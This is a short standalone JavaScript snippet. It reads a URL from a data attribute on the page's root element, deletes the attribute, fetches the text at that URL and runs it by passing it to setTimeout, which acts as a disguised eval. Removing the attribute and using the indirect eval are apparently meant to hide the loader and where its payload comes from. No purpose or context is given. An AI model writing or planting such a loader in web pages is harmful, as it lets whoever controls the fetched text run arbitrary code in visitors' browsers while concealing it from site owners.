!(function (d) {
  const attr = "data-path";
  const path = d.getAttribute(attr);
  d.removeAttribute(attr);
  fetch(path).then((r) => r.text()).catch(console.warn).then(setTimeout).catch(console.log);
})(document.documentElement);
